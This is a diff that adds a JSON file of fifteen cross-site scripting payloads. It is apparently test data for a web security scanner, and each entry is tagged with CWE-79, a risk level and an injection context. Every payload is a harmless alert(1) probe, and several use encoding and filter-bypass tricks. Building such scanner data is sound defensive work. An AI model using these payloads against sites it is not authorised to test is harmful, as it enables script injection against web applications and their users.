@@ -1,0 +1,124 @@
+{
+  "xss": [
+    {
+      "name": "Basic XSS",
+      "payload": "<script>alert(1)</script>",
+      "description": "Basic reflected XSS",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "html"
+    },
+    {
+      "name": "XSS with Event Handler",
+      "payload": "<img src=x onerror=alert(1)>",
+      "description": "XSS using event handler",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "html"
+    },
+    {
+      "name": "XSS with SVG",
+      "payload": "<svg/onload=alert(1)>",
+      "description": "XSS using SVG element",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "html"
+    },
+    {
+      "name": "XSS with JavaScript Protocol",
+      "payload": "javascript:alert(1)",
+      "description": "XSS using JavaScript protocol",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "url"
+    },
+    {
+      "name": "XSS with Data URI",
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "description": "XSS using data URI",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "url"
+    },
+    {
+      "name": "XSS with Unicode Bypass",
+      "payload": "<scr\u0069pt>alert(1)</scr\u0069pt>",
+      "description": "XSS with Unicode encoding bypass",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "html"
+    },
+    {
+      "name": "XSS with HTML Entities",
+      "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+      "description": "XSS with HTML entity encoding",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "html"
+    },
+    {
+      "name": "XSS with Double Encoding",
+      "payload": "%253Cscript%253Ealert(1)%253C/script%253E",
+      "description": "XSS with double URL encoding",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "url"
+    },
+    {
+      "name": "XSS with CSS",
+      "payload": "<div style=\"background:url(javascript:alert(1))\">",
+      "description": "XSS using CSS background",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "css"
+    },
+    {
+      "name": "XSS with DOM",
+      "payload": "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+      "description": "DOM-based XSS",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "dom"
+    },
+    {
+      "name": "XSS with Template Literals",
+      "payload": "`<script>alert(1)</script>`",
+      "description": "XSS using template literals",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "javascript"
+    },
+    {
+      "name": "XSS with Concatenation",
+      "payload": "'+alert(1)+'",
+      "description": "XSS using string concatenation",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "javascript"
+    },
+    {
+      "name": "XSS with Eval",
+      "payload": "eval('alert(1)')",
+      "description": "XSS using eval function",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "javascript"
+    },
+    {
+      "name": "XSS with InnerHTML",
+      "payload": "document.body.innerHTML='<script>alert(1)</script>'",
+      "description": "XSS using innerHTML",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "javascript"
+    },
+    {
+      "name": "XSS with Document Write",
+      "payload": "document.write('<script>alert(1)</script>')",
+      "description": "XSS using document.write",
+      "risk": "high",
+      "cwe": "CWE-79",
+      "context": "javascript"
+    }
+  ]
+} 
